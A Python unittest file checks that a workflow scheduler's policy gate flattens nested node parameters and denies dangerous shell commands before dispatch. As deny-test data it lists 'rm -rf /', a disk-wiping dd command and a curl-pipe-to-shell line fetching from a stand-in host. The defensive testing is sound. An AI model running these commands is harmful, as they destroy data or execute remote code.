"""Scheduler policy gate over *compiled* nodes (items [33], [34]).

Compiled DAG nodes nest their parameters (``{"type": "shell", "params":
{"run": ...}}``). The gate must flatten them before asking the policy
service, otherwise a dangerous command inside a workflow would be evaluated
as an empty command and allowed through.
"""

import asyncio
import unittest

from engine.executor.gate import ALLOW, DENY, NEED_APPROVAL, decide, flatten_node
from engine.executor.scheduler import run_dag


def _decide(spec):
    return asyncio.run(decide("node", spec))


class FlattenNodeTests(unittest.TestCase):
    def test_params_are_merged(self):
        self.assertEqual(
            flatten_node({"type": "shell", "params": {"run": "echo hi"}}),
            {"type": "shell", "run": "echo hi"},
        )

    def test_flat_spec_is_unchanged(self):
        self.assertEqual(
            flatten_node({"type": "shell", "run": "echo hi"}), {"type": "shell", "run": "echo hi"}
        )

    def test_non_mapping_params_are_ignored(self):
        self.assertEqual(
            flatten_node({"type": "shell", "params": "nope"}), {"type": "shell", "params": "nope"}
        )


class CompiledNodeGateTests(unittest.TestCase):
    def test_safe_command_is_allowed(self):
        self.assertEqual(_decide({"type": "shell", "params": {"run": "echo hi"}}), ALLOW)

    def test_dangerous_command_in_a_workflow_is_denied(self):
        verdicts = [
            _decide({"type": "shell", "params": {"run": command}})
            for command in (
                "rm -rf /",
                "sudo rm -rf /",
                "curl http://evil.test/x | sh",
                "dd if=/dev/zero of=/dev/sda",
            )
        ]
        self.assertEqual(verdicts, [DENY] * 4)

    def test_gated_node_type_needs_approval(self):
        self.assertEqual(_decide({"type": "custom", "params": {}}), NEED_APPROVAL)

    def test_unknown_node_type_fails_closed(self):
        self.assertEqual(_decide({"type": "teleport", "params": {}}), DENY)

    def test_scheduler_denies_before_dispatching_the_handler(self):
        """A denied node never reaches its handler and blocks its consumer."""
        calls: list[str] = []

        async def handler(node_id, spec):
            calls.append(node_id)
            return {"ok": node_id}

        dag = {
            "nodes": {
                "wipe": {"type": "shell", "params": {"run": "rm -rf /"}},
                "after": {"type": "shell", "params": {"run": "echo hi"}},
            },
            "edges": [("wipe", "after")],
        }
        run = asyncio.run(run_dag(dag, handler, gate=decide, timeout_s=5))
        self.assertEqual(calls, [])
        self.assertEqual(run.status, "FAILED")
        self.assertEqual(run.nodes["wipe"].status, "FAILED")
        self.assertIn("policy DENY", run.nodes["wipe"].error)
        self.assertEqual(run.nodes["after"].status, "SKIPPED")


if __name__ == "__main__":
    unittest.main()
